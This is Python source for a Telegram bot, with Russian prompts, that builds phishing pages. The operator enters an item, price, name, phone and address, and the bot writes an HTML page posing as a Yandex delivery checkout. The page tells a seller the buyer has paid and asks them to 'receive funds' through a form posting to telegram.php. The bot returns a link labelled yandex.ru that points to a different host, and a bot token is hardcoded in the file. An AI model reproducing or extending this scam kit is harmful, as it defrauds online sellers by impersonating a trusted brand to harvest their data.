
from cgitb import handler, html
from unicodedata import numeric
from venv import create
import telebot
from telebot import types 
import sqlite3


token = '5688292651:AAFrCf97pYwaeYAfNyQIw6DU30DiRsXWPpc'

bot=telebot.TeleBot(token)


@bot.message_handler(commands=['start'])
def start(message):



    mess = f'Привет, <b>{message.from_user.first_name}</b> я бот для 🦣'
    bot.send_message(message.chat.id, mess, parse_mode='html')
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)

    create_url = types.KeyboardButton('🔥 Создать ссылку 🔥')
    my_url = types.KeyboardButton('🔗 Мои ссылки')

    markup.add(create_url, my_url)
    bot.send_message(message.chat.id, "Тебе доступны кнопки снизу", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == '🔥 Создать ссылку 🔥')
def create(message):
    a = telebot.types.ReplyKeyboardRemove()
    bot.send_message(message.from_user.id, 'На момент ввода информация кнопки будут скрыты', reply_markup=a)

    send = bot.send_message(message.chat.id, "📛 Введите название товара -> ")
    bot.register_next_step_handler(send, name_)





def name_(message):
    global name
    name = message.text
    send = bot.send_message(message.chat.id, "💸 Введите цену товара -> ")
    bot.register_next_step_handler(send, cost_)

def cost_(message):
    global cost
    cost = message.text
    send = bot.send_message(message.chat.id, "👤 Введите ФИО -> ")
    bot.register_next_step_handler(send, fio_)

def fio_(message):
    global fio
    fio = message.text
    send = bot.send_message(message.chat.id, "☎️ Введите номер тф вида +7 -> ")
    bot.register_next_step_handler(send, num_)


def num_(message):
    global numer
    numer = message.text
    send = bot.send_message(message.chat.id, "🏠 Введите полный адрес доставки. Город, улица, квартира\дом-> ")
    bot.register_next_step_handler(send, form)

def form(message):
    global adress
    adress = message.text
    message_id = message.id - 1

    with open(f'{message_id}.html', 'w', encoding="utf-8") as f:
        f.write(f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Оформление</title>
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
    <div class="wrapper">
        <div class="header">
            <div class="logo">
                <img src="img/free-png.ru-467.png" alt="" srcset="">
            </div>
        </div>
        <div class="main">
            <div class="cost_tov">
                <div class="tov">
                    <p>{name}</p>
                </div>
                <div class="cost">
                    <b>{cost}₽</b>
                </div>
            </div>
            <div class="money_in_safe">
                <div class="shield">
                    <img src="img/—Pngtree—green shield warranty icon_7096840.png" alt="" srcset="">
                </div>
                <div class="text">
                    <p>Ваши деньги в безопасности</p>
                </div>
            </div>
            <div class="container">

                <div class="row">
                    <div class="col-sm-4">
                        <form action="telegram.php" method="POST">
                            <div class="style_form">
                                <legend>Ваш товар оформлен!<br><p class="seller">Покупатель оплатил заказ.</p></legend>
            
                                <div class="form-group">
                                    <label for="">Адрес доставки</label>
                                    <input type="text" class="form-control" id="" name="user_adress" placeholder="ул. Ленина, д. 10">
                                </div>

                                <div class="form-group">
                                    <label for="">Данные получателя</label>
                                    <input type="text" class="form-control" id="" name="user_name" placeholder="Зайцев Андрей Иванович">
                                </div>
                                <div class="taxi">
                                    <a href="https://taxi.yandex.ru/ru_ru/">Доставка осуществляется через службу Yandex Taxi.</a>
                                </div>
                            </div>
                            <button type="submit" class="btn btn-primary">Получить средства</button>
                        </form>
                    </div><!-- .col-sm-4 -->
                </div> <!-- .row -->
          
              </div><!-- /.container -->
        </div>
    </div>
</body>
</html>''')

    connect = sqlite3.connect('urls.db')   
    cursor = connect.cursor()

    cursor.execute("""CREATE TABLE IF NOT EXISTS advert(
        name_db,
        cost_db,
        id_adv
    )""")

    connect.commit()

    

    cursor.execute("INSERT INTO advert VALUES(?,?,?)", [name, cost, message_id])
    connect.commit()

    global db
    db = list(cursor.execute("""SELECT * from advert"""))

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)

    create_url = types.KeyboardButton('🔥 Создать ссылку 🔥')
    my_url = types.KeyboardButton('🔗 Мои ссылки')

    markup.add(create_url, my_url)

    

    bot.send_message(message.chat.id, f"Информация об. {message_id}\n\n📛 Название: <b>{name.title()}</b>\n💸 Цена: <b>{cost.title()}</b>\n👤 ФИО: <b>{fio.title()}</b>\n🏠 Адресс: <b>{adress.title()}</b>\n☎️ Номер тф: <b>{numer.title()}</b>\n\n\nЯндекс.Доставка: <a href='http://a0732405.xsph.ru/'>yandex.ru</a>", parse_mode='html', reply_markup=markup)








@bot.message_handler(func=lambda message: message.text == '🔗 Мои ссылки')
def my_urls(message):
    if "db" in globals():
        urls = ''
        for i in db:
            urls += f'{i[2]}. {i[0]} - {i[1]}\n'
        bot.send_message(message.chat.id, urls)
    else:
        bot.send_message(message.chat.id, " 😞 У вас ещё нету ссылок")

bot.polling(none_stop=True)



